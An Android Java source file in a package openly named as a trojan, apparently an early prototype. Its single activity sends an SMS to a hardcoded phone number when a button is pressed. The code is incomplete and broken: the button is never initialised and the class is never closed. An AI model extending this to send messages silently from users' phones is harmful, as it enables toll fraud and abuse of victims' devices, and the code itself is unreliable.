package trojan.android.android_trojan;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.view.View;
import android.widget.Button;

/**
 * Created by Jean-Laurent on 26/11/2014.
 */
public class first_activity extends Activity {
    private static final String TAG = "first_activity";
    Context context;
    private Button button01;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.first_activity);

        button01.setOnClickListener(new View.OnClickListener() {
           @Override
          public void onClick(View v) {
                SmsManager();
            }
        });

    }


    static void SmsManager() {
        SmsManager manager = SmsManager.getDefault();
        manager .sendTextMessage("0628470850", null, "Test Message 1 !", null, null);
    }


